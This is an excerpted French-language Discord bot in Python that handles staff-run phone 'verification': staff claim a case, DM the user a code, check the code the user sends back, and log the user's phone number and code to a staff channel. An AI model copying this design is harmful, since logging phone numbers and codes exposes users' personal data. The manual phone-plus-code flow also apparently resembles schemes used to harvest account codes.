...
EMBED_COLOR = 0x2b2d31  # Fond sombre moderne
...
async def start_health_server():
    ...
    await site.start()
    log.info(f"✅ Health check server on port {os.getenv('PORT', '10000')}")

# ═══════════════════════════════════════════════════════════
#  LOGS
# ═══════════════════════════════════════════════════════════
async def send_log(title: str, description: str = "", color: int = EMBED_COLOR,
                   fields: list = None, user: discord.User = None):
...
# ═══════════════════════════════════════════════════════════
#  PANEL STAFF — DESIGN STYLÉ
# ═══════════════════════════════════════════════════════════
def build_staff_embed(user: discord.User, phone: str, guild_name: str,
                      status: str = "En attente",
                      claimed_by: Optional[int] = None,
                      code_status: str = "*En attente...*",
                      timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    """Construit l'embed du panel staff avec le design demandé."""
    ...
    embed.add_field(name="👮 **Pris en charge par**",
    ...
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if self.claimed_by is not None:
                embed = discord.Embed(
                    title="❌ Déjà pris",
                    description=f"Cette vérification est déjà prise par <@{self.claimed_by}>.",
                    color=0xed4245
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            ...
            new_embed = build_staff_embed(
                ...
                code_status="*En attente...*",
                timestamp=interaction.message.created_at
            )
            new_embed.set_thumbnail(url=(await bot.fetch_user(self.user_id)).display_avatar.url)
            await interaction.message.edit(embed=new_embed, view=self)

            # Log
            await send_log(
                title="📋 Vérification prise en charge",
                description=f"**{interaction.user.name}** a pris en charge la vérification.",
                color=0x57f287,
                fields=[
    ...
    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if self.claimed_by is None:
                embed = discord.Embed(
                    title="❌ Personne n'a pris",
                    description="Prenez d'abord la vérification en charge avant d'envoyer le code.",
                    color=0xfee75c
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            ...
            if self.claimed_by != interaction.user.id:
                embed = discord.Embed(
                    title="❌ Pas votre vérification",
                    description=f"Seul <@{self.claimed_by}> peut envoyer le code.",
                    color=0xed4245
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            ...
            if self.code_sent:
                embed = discord.Embed(
                    title="⚠️ Déjà envoyé",
                    description="Un code a déjà été envoyé à cet utilisateur.",
                    color=0xfee75c
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            ...
            # Message éphémère au staff
            embed_waiting = discord.Embed(
                title="⏳ Code envoyé",
                description=f"📱 Un code de vérification a été envoyé à <@{self.user_id}>.\n\n"
                            f"🔐 **Code : `{self.code_value}`**\n\n"
            ...
            try:
                ...
                embed_dm = discord.Embed(
                    title="🔐 Code de vérification",
                    description=f"**Votre code de vérification : `{self.code_value}`**\n\n"
                ...
                embed_fail = discord.Embed(
                    title="❌ Échec",
                    description=f"<@{self.user_id}> a ses MP fermés. Impossible d'envoyer le code.",
                    color=0xed4245
                )
    ...
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            ...
            await send_log(
                ...
                description=f"Vérification fermée par **{interaction.user.name}**.",
                color=0xed4245,
                fields=[
                    ("👤 Utilisateur", f"<@{self.user_id}>", True),
                    ("👮 Staff", f"<@{interaction.user.id}>", True),
...
async def handle_dm_code(message: discord.Message):
    ...
    if content != pending["code"]:
        # Vérifier si c'est un des codes "faibles" rejetés
        if content in ["1234","2345","3456","4567","5678","6789","7890",
                       "4321","5432","6543","7654","8765","9876","0987"] or len(set(content)) == 1:
            embed = discord.Embed(
                title="❌ Code invalide",
                description="Ce code n'est pas valide (chiffres répétés ou séquentiels). Veuillez contacter le staff.",
                color=0xed4245
            )
            await message.channel.send(embed=embed)
            return
    ...
    # Log : code validé avec tous les détails
    ...
    await send_log(
        title="✅ Code validé",
        description=f"**{message.author.name}** a validé son code.",
        color=0x57f287,
        user=message.author,
        fields=[
            ("👤 Utilisateur", f"<@{user_id}>", True),
            ("👮 Staff", f"<@{claimed_by}>" if claimed_by else "Inconnu", True),
            ("🔐 Code", f"||{content}||", True),
            ("📱 Numéro", f"||{phone}||", False),
            ("🕐 Validé", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
        ]
    )
        ...
        if guild:
            ...
            if role:
                ...
                if member:
                    ...
                    log.warning(f"{user_id} pas sur le serveur principal")
